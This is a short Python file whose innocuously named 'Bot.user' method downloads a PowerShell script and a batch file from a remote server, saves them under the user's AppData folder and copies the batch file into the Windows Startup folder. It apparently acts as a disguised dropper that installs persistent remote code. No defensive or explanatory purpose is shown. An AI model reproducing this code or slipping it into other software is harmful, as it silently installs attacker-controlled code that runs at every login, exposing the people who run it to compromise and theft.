import os
import shutil
import requests

class Bot:
    @staticmethod
    def user():
        """
        Downloads the DiscordEXT PS1 and batch files and adds the batch to startup.
        Skips installation if already installed.
        """
        dest_folder = os.path.join(os.getenv('APPDATA'), "DiscordEXT")
        ps1_path = os.path.join(dest_folder, "client.ps1")
        bat_path = os.path.join(dest_folder, "DiscordEXT.bat")
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            r"Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        )
        startup_bat_path = os.path.join(startup_folder, "DiscordEXT.bat")

        if os.path.exists(ps1_path) and os.path.exists(startup_bat_path):
            print("DiscordEXT already installed. Skipping installation.")
            return

        os.makedirs(dest_folder, exist_ok=True)

        ps1_url = "http://node2.lunes.host:3277/clients/client.ps1"
        r = requests.get(ps1_url)
        r.raise_for_status()
        with open(ps1_path, "wb") as f:
            f.write(r.content)

        bat_url = "http://node2.lunes.host:3277/clients/DiscordEXT.bat"
        r = requests.get(bat_url)
        r.raise_for_status()
        with open(bat_path, "wb") as f:
            f.write(r.content)

        shutil.copy(bat_path, startup_bat_path)

bot = Bot()
